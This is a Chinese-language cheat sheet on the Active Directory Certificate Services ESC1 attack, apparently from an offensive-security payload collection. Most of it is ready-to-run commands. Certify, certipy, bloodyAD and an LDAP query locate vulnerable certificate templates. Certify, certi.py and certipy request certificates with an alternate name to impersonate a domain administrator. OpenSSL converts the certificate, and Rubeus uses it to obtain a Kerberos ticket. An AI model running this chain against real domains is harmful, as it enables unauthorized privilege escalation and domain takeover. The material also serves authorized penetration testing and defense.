# Active Directory - 证书 ESC1

## ESC1 - 错误配置的证书模板

> 域用户可以注册 **VulnTemplate** 模板，该模板可用于客户端身份验证且设置了 **ENROLLEE_SUPPLIES_SUBJECT** 标志。这意味着任何人都可以注册此模板并指定任意的主体备用名称（Subject Alternative Name），例如指定为域管理员。该标志允许在证书的 Subject 之外绑定其他身份。

**前提条件**

* 允许 AD 身份验证的模板
* **ENROLLEE_SUPPLIES_SUBJECT** 标志
* [PKINIT] 客户端身份验证、智能卡登录、任何用途或无 EKU（扩展/增强密钥用途）

**利用方法**

* 使用 [Certify.exe](https://github.com/GhostPack/Certify) 检查是否存在易受攻击的模板

    ```ps1
    Certify.exe find /vulnerable
    Certify.exe find /vulnerable /currentuser
    # 或
    PS> Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=lab,DC=local'
    # 或
    certipy 'domain.local'/'user':'password'@'domaincontroller' find -bloodhound
    # 或
    python bloodyAD.py -u john.doe -p 'Password123!' --host 192.168.100.1 -d bloody.lab get search --base 'CN=Configuration,DC=lab,DC=local' --filter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))'
    ```

* 使用 Certify、[Certi](https://github.com/eloypgz/certi) 或 [Certipy](https://github.com/ly4k/Certipy) 请求证书并添加备用名称（要模拟的用户）

    ```ps1
    # 通过在提升权限的命令提示符中使用 "/machine" 参数执行 Certify 来为机器帐户请求证书
    Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:VulnTemplate /altname:domadmin
    certi.py req 'contoso.local/Anakin@dc01.contoso.local' contoso-DC01-CA -k -n --alt-name han --template UserSAN
    certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local'
    ```

* 使用 OpenSSL 转换证书，不要输入密码

    ```ps1
    openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
    ```

* 将 cert.pfx 移动到目标机器文件系统，使用 Rubeus 为 altname 用户请求 TGT

    ```ps1
    Rubeus.exe asktgt /user:domadmin /certificate:C:\Temp\cert.pfx
    ```

**警告**：即使用户或计算机重置了密码，这些证书仍然有效！

**注意**：注意查找 **EDITF_ATTRIBUTESUBJECTALTNAME2**、**CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT**、**ManageCA** 标志，以及 NTLM 中继到 AD CS HTTP 端点。

## 参考资料
